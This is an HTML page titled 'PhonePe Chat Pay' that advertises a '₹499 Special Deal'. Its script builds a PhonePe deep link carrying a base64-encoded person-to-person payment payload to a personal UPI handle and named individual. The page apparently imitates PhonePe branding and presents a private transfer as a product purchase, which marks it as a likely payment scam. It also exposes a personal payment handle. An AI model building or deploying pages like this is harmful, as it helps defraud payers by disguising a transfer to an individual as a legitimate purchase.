<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PhonePe Chat Pay</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#f1f3f6;
}
.header{
  background:#fff;
  padding:14px;
  font-weight:bold;
  box-shadow:0 2px 4px rgba(0,0,0,.12);
}
.card{
  background:#fff;
  margin:16px;
  padding:16px;
  border-radius:8px;
}
.bottom{
  position:fixed;
  bottom:0;
  width:100%;
  background:#fff;
  padding:12px;
  box-shadow:0 -2px 5px rgba(0,0,0,.15);
}
.pay{
  display:block;
  text-align:center;
  background:#5f259f;
  color:#fff;
  padding:14px;
  border-radius:6px;
  font-size:18px;
  text-decoration:none;
}
.amount{
  font-size:26px;
  font-weight:bold;
  color:#5f259f;
  text-align:center;
}
</style>
</head>

<body>

<div class="header">PhonePe Chat Pay</div>

<div class="card">
  <h3>Special Deal</h3>
  <p class="amount">₹499</p>
  <p>Pay using PhonePe chat-style payment</p>
</div>

<div class="bottom">
  <a id="payBtn" class="pay">Pay with PhonePe</a>
</div>

<script>
(function(){

  // 🔥 CONFIG
  const AMOUNT = 499;
  const PAYEE_UPI = "paytm.s1xjfgt@pty"; // personal VPA
  const PAYEE_NAME = "Shyam Veer";

  // 🔥 P2P PAYLOAD (IMPORTANT)
  const payload = {
    content: {
      pa: PAYEE_UPI,
      pn: PAYEE_NAME,
      am: AMOUNT,
      cu: "INR",
      tr: "TXN" + Date.now(),
      mode: "P2P"
    },
    version: "1"
  };

  // 🔥 BASE64 ENCODE
  const encodedData = btoa(JSON.stringify(payload));

  // 🔥 PHONEPE DEEP LINK (REAL MAGIC)
  const deeplink = "phonepe://native?data=" + encodeURIComponent(encodedData);

  document.getElementById("payBtn").onclick = function(){
    window.location.href = deeplink;

    // fallback
    setTimeout(() => {
      if (document.hasFocus()) {
        alert("PhonePe open nahi hua?\nPhonePe install/update karo.");
      }
    }, 3000);
  };

})();
</script>

</body>
</html>
